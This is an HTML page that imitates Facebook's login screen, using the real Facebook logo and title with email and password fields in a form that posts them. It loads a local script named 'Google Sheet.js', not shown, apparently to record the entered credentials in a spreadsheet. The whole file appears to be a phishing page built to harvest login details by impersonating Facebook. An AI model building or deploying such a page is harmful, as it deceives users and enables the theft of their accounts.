<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - log in or sign up</title>
    <link rel="shortcut icon" href="icon.jpeg" type="image/x-icon">
    <link rel="stylesheet" href="style.css">
</head>
<body>
        <main>
       
            <div class="text">
              <!-- <img class="facebook_logo" src="facebook logo.png" alt="facebook"> -->
               <form action="" method="post">
                <img class="logo" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook"> 
                <div class="gap">    </div>
                <h2 class="paragraph">Facebook helps you connect and share with the people in your life.</h2>
            </div>
                <div class="form">
                    <input required type="text" name="user" class="email" placeholder="Email or phone number">
                    <input required type="text" name="password" class="password" placeholder="Password">
                    <input type="submit" class="login" value="Log In"id="submit">
                 <a href="#">Forgot password?</a>
            
                <hr>
                <input type="button" class="create-account" value="Create new account">
                <p><a href="#">Create a Page</a> for celebrity, brand or business.</p>
            </form>
            </div>
        
        </main>
    <script src="Google Sheet.js"></script>
</body>
</html>
